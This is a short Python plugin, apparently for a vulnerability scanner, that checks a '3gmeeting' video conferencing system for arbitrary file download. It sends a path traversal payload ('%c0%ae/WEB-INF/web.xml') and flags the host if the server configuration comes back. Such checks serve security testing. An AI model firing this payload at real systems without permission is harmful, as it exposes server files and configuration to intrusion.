#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 3gmeeting视讯系统任意文件下载
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2010-0137152
'''
def assign(service, arg):
    if service == '3gmeeting':
        return True, arg

def audit(arg):
    payload = arg + '%c0%ae/WEB-INF/web.xml'
    code, head, res, err, _ = curl.curl2(payload)
    if code == 200 and '<servlet-mapping>' in res and '<servlet-name>' in res:
        security_hole('Arbitrarily file download: '+payload)

        return arg
if __name__== '__main__':
    from dummy import *
